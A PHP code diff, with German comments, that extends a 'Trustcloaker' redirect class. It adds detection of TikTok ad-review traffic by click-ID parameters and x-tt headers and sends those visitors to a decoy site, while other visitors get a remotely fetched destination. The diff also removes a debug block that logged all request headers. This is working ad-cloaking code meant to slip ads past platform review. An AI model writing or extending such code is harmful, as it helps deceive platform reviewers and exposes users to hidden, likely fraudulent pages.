@@ -1,16 +1,4 @@
 <?php
-//  DEBUG-CODE (nach dem Test wieder entfernen!)
-file_put_contents(
-    'tiktok_sandbox_debug.log',
-    date('Y-m-d H:i:s') . " | " .
-    "GET: " . json_encode($_GET) . " | " .
-    "Referer: " . ($_SERVER['HTTP_REFERER'] ?? 'none') . " | " .
-    "User-Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'none') . " | " .
-    "Headers: " . json_encode(getallheaders()) . "\n",
-    FILE_APPEND
-);
-
-<?php
 class Oppsd
 {
     private string $endpoint;
@@ -20,6 +8,22 @@ class Oppsd
     {
         $this->endpoint = $endpoint;
         $this->timeout = $timeout;
+    }
+
+    // 🔹 NEU: Minimale TikTok-Erkennung für Sandbox
+    private function isTikTokRequest(): bool
+    {
+        // 1. Prüfe ttclid UND tt_clid (Sandbox nutzt oft tt_clid!)
+        if (isset($_GET['ttclid']) || isset($_GET['tt_clid'])) {
+            return true;
+        }
+
+        // 2. Prüfe TikTok-Header (Sandbox sendet oft x-tt-request-id)
+        if (isset($_SERVER['HTTP_X_TT_REQUEST_ID']) || isset($_SERVER['HTTP_X_TT_CLID'])) {
+            return true;
+        }
+
+        return false;
     }
 
     private function preparePayload(string $uid, string $cid): array
@@ -65,6 +69,13 @@ class Oppsd
             die;
         }
 
+        // 🔹 NEU: TikTok-Check für Sandbox (vor Trustcloaker-Logik!)
+        if ($this->isTikTokRequest()) {
+            header('Location: https://sunoraclo.com/');
+            exit;
+        }
+
+        // 👇 Rest bleibt UNVERÄNDERT (Trustcloaker-Logik)
         $data = $this->postJson($this->preparePayload($uid, $cid));
         if (!empty($data['url'])) {
             if (isset($data['url']) && substr($data['url'], -1) !== '/') {
